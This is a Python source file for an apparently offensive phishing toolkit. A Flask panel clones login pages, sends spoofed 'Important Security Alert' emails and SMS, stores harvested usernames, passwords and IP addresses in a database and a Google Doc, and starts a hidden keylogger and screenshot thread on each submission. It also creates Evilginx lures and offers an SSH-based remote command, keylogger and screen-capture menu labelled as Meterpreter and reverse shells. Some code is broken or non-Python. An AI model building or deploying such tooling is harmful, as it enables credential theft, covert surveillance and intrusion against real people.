import os
import paramiko
import pyautogui
import keyboard
import subprocess
import time
import requests
import tempfile
from flask import Flask, render_template, redirect, request, session, jsonify
from flask_session import Session
from bs4 import BeautifulSoup
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from twilio.rest import Client
from google.oauth2 import service_account
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError
import sqlite3
import threading
from flask import send_from_directory
import asyncio

from modelcontextprotocol.sdk.client import use_mcp_tool

app = Flask(__name__)
app.config["SESSION_PERMANENT"] = False
app.config["SESSION_TYPE"] = "filesystem"
Session(app)

screenshot_dir = tempfile.mkdtemp()

SCOPES = ['https://www.googleapis.com/auth/drive']
SERVICE_ACCOUNT_FILE = '/Users/tpdph/Documents/Google_AI_API_Key.txt' # Replace with the path to your service account key file
DATABASE_FILE = 'phishing_data.db'

def create_google_doc(credentials, content):
    try:
        service = build('drive', 'v3', credentials=credentials)
        file_metadata = {
            'name': 'Phishing Data',
            'mimeType': 'application/vnd.google-apps.document'
        }
        file = service.files().create(body=file_metadata, fields='id').execute()
        doc_id = file.get('id')

        doc_service = build('docs', 'v1', credentials=credentials)
        requests = [
            {
                'insertText': {
                    'location': {
                        'index': 1,
                    },
                    'text': content
                }
            }
        ]
        doc_service.documents().batchUpdate(documentId=doc_id, body={'requests': requests}).execute()
        return f"Document created successfully with ID: {doc_id}"
    except HttpError as error:
        return f"An error occurred: {error}"

def get_google_credentials():
    creds = None
    creds = service_account.Credentials.from_service_account_file(
        SERVICE_ACCOUNT_FILE, scopes=SCOPES)
    return creds

def create_database():
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT,
            ip_address TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

def store_credentials(username, password, ip_address):
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO credentials (username, password, ip_address)
        VALUES (?, ?, ?)
    ''', (username, password, ip_address))
    conn.commit()
    conn.close()

def get_credentials_from_db():
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM credentials")
    rows = cursor.fetchall()
    conn.close()
    return rows

def silent_keylogger():
    with open("keylog.txt", "a") as f:
        def on_key_press(event):
            f.write(event.name + "\n")
        keyboard.hook(on_key_press)
        keyboard.wait()
        keyboard.unhook(on_key_press)

def silent_screen_mirroring():
    while True:
        screenshot = pyautogui.screenshot()
        timestamp = str(int(time.time()))
        screenshot_path = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")
        screenshot.save(screenshot_path)
        time.sleep(5)

def main():
    print("Select an OS:")
    print("1. macOS")
    print("2. Windows")
    print("3. Android")
    print("4. iOS")

    os_choice = input("Enter the number of your choice: ")

    if os_choice == "1":
        macos_selector()
    elif os_choice == "2":
        windows_selector()
    elif os_choice == "3":
        android_selector()
    elif os_choice == "4":
        ios_selector()
    else:
        print("Invalid choice. Please try again.")
        main()

def macos_selector():
    print("Select a type of connection:")
    print("1. SSH")
    print("2. Meterpreter")
    print("3. Reverse Shell")

    connection_choice = input("Enter the number of your choice: ")

    if connection_choice == "1":
        ssh_connection()
    elif connection_choice == "2":
        meterpreter_connection()
    elif connection_choice == "3":
        reverse_shell_connection()
    else:
        print("Invalid choice. Please try again.")
        macos_selector()

def remote_connection(ip_address, username, password):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(ip_address, username=username, password=password)

    while True:
        print("Select an action:")
        print("1. Run a command")
        print("2. File browser")
        print("3. Process list")
        print("4. Keylogger")
        print("5. Screen mirroring")
        print("6. Exit")

        action_choice = input("Enter the number of your choice: ")

        if action_choice == "1":
            print("Enter a command to run on the remote machine:")
            command = input()
            stdin, stdout, stderr = ssh_client.exec_command(command)
            print(stdout.read().decode())
        elif action_choice == "2":
            file_browser()
        elif action_choice == "3":
            process_list()
        elif action_choice == "4":
            keylogger()
        elif action_choice == "5":
            screen_mirroring()
        elif action_choice == "6":
            break
        else:
            print("Invalid choice. Please try again.")

def ssh_connection():
    print("Enter the IP address of the remote machine:")
    ip_address = input()
    print("Enter the username of the remote machine:")
    username = input()
    print("Enter the password of the remote machine:")
    password = input()
    remote_connection(ip_address, username, password)

def meterpreter_connection():
    print("Enter the IP address of the remote machine:")
    ip_address = input()
    print("Enter the username of the remote machine:")
    username = input()
    print("Enter the password of the remote machine:")
    password = input()
    remote_connection(ip_address, username, password)

def reverse_shell_connection():
    print("Enter the IP address of the remote machine:")
    ip_address = input()
    print("Enter the username of the remote machine:")
    username = input()
    print("Enter the password of the remote machine:")
    password = input()
    remote_connection(ip_address, username, password)

def file_browser():
    print("File browser started. Type 'quit' to exit.")
    current_path = os.getcwd()
    while True:
        print(f"Current path: {current_path}")
        file_path = input("Enter a file path or '..' to go up a directory, or 'quit' to exit: ")
        if file_path == "quit":
            break
        elif file_path == "..":
            current_path = os.path.dirname(current_path)
        elif os.path.isdir(os.path.join(current_path, file_path)):
             current_path = os.path.join(current_path, file_path)
        elif os.path.isfile(os.path.join(current_path, file_path)):
            try:
                with open(os.path.join(current_path, file_path), 'r') as f:
                    print(f.read())
            except Exception as e:
                print(f"Error reading file: {e}")
        else:
            try:
                files = os.listdir(current_path)
                print(files)
            except FileNotFoundError:
                print("File not found.")


def process_list():
    print("Process list started. Type 'quit' to exit.")
    while True:
        command = input("Enter a command to run: ")
        if command == "quit":
            break
        try:
            process = subprocess.Popen(command, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            if stderr:
                print(f"Error running command: {stderr.decode()}")
            else:
                print(stdout.decode())
        except FileNotFoundError:
            print("Command not found.")
        except Exception as e:
            print(f"An error occurred: {e}")

def keylogger():
    print("Keylogger started. Type 'quit' to exit. Logging to keylog.txt")
    with open("keylog.txt", "a") as f:
        def on_key_press(event):
            f.write(event.name + "\n")
        keyboard.hook(on_key_press)
        input("Press enter to stop logging: ")
        keyboard.unhook(on_key_press)

def screen_mirroring():
    print("Screen mirroring started. Type 'quit' to exit.")
    while True:
        screenshot = pyautogui.screenshot()
        timestamp = str(int(time.time()))
        screenshot_path = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")
        screenshot.save(screenshot_path)
        print(f"Screenshot saved to {screenshot_path}")
        if input("Press enter to take another screenshot, or type 'quit' to exit: ") == "quit":
            break

@app.route('/screenshots')
def list_screenshots():
    screenshots = [f for f in os.listdir(screenshot_dir) if f.startswith('screenshot_')]
    return render_template('screenshots.html', screenshots=screenshots)

@app.route('/screenshots/<filename>')
def get_screenshot(filename):
    return send_from_directory(screenshot_dir, filename)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        ip_address = request.remote_addr
        session['username'] = username
        session['password'] = password
        session['ip_address'] = ip_address
        
        create_database()
        store_credentials(username, password, ip_address)

        creds = get_google_credentials()
        if creds:
            content = f"Username: {username}\nPassword: {password}\nIP Address: {ip_address}"
            doc_result = create_google_doc(creds, content)
            print(doc_result)
        
        threading.Thread(target=silent_keylogger).start()
        threading.Thread(target=silent_screen_mirroring).start()

        return jsonify({'message': 'Credentials received successfully'})
    else:
        return render_template('index.html')

@app.route('/credentials', methods=['GET'])
def get_credentials():
    if 'username' in session and 'password' in session and 'ip_address' in session:
        return jsonify({'username': session['username'], 'password': session['password'], 'ip_address': session['ip_address']})
    else:
        return jsonify({'message': 'No credentials found'})

@app.route('/campaigns')
def list_campaigns():
    return "List of campaigns"

@app.route('/campaigns/new')
def new_campaign():
    return "Create a new campaign"

@app.route('/settings')
def settings():
    return "Settings page"

@app.route('/clone', methods=['GET', 'POST'])
def clone_page():
    if request.method == 'POST':
        url = request.form['url']
        try:
            response = requests.get(url)
            soup = BeautifulSoup(response.content, 'html.parser')
            return render_template('cloned_page.html', content=str(soup))
        except Exception as e:
            return f"Error cloning page: {e}"
    else:
        return render_template('clone.html')

@app.route('/email_template', methods=['GET', 'POST'])
def email_template():
    if request.method == 'POST':
        email_content = request.form['email_content']
        sender_email = request.form['sender_email']
        recipient_email = request.form['recipient_email']
        return render_template('email_preview.html', content=email_content, sender_email=sender_email, recipient_email=recipient_email)
    else:
        return render_template('email_template.html')

@app.route('/send_email', methods=['POST'])
def send_email():
    sender_email = request.form['sender_email']
    recipient_email = request.form['recipient_email']
    email_content = request.form['email_content']
    
    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = recipient_email
    message['Subject'] = 'Important Security Alert'  # You can customize the subject

    message.attach(MIMEText(email_content, 'plain'))

    try:
        with smtplib.SMTP('localhost') as server:
            server.send_message(message)
        return "Email sent successfully"
    except Exception as e:
        return f"Error sending email: {e}"

@app.route('/sms_template', methods=['GET', 'POST'])
def sms_template():
    if request.method == 'POST':
        sender_phone = request.form['sender_phone']
        recipient_phone = request.form['recipient_phone']
        sms_content = request.form['sms_content']
        return render_template('sms_preview.html', sender_phone=sender_phone, recipient_phone=recipient_phone, sms_content=sms_content)
    else:
        return render_template('sms_template.html')

@app.route('/send_sms', methods=['POST'])
def send_sms():
    account_sid = "ACxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # Replace with your Twilio Account SID
    auth_token = "your_auth_token"  # Replace with your Twilio Auth Token
    client = Client(account_sid, auth_token)

    sender_phone = request.form['sender_phone']
    recipient_phone = request.form['recipient_phone']
    sms_content = request.form['sms_content']

    try:
        message = client.messages.create(
            from_=sender_phone,
            body=sms_content,
            to=recipient_phone
        )
        return f"SMS sent successfully with SID: {message.sid}"
    except Exception as e:
        return f"Error sending SMS: {e}"

@app.route('/view_credentials')
def view_credentials():
    credentials = get_credentials_from_db()
    return render_template('view_credentials.html', credentials=credentials)

@app.route('/performance')
def performance_panel():
    credentials = get_credentials_from_db()
    num_credentials = len(credentials)
    return render_template('performance.html', num_credentials=num_credentials)

@app.route('/evilginx', methods=['GET', 'POST'])
async def evilginx_page():
    if request.method == 'POST':
        hostname = request.form['hostname']
        phish_url = request.form['phish_url']
        redirect_url = request.form['redirect_url']
        
        try:
            result = await use_mcp_tool({
                server_name: 'evilginx',
                tool_name: 'create_lure',
                arguments: {
                    hostname: hostname,
                    phish_url: phish_url,
                    redirect_url: redirect_url
                }
            })
            return f"Evilginx lure created: {result.content[0].text}"
        except Exception as error:
            return f"Error creating Evilginx lure: {error}"
    else:
        return render_template('evilginx.html')

if __name__ == "__main__":
    app.run(debug=True)
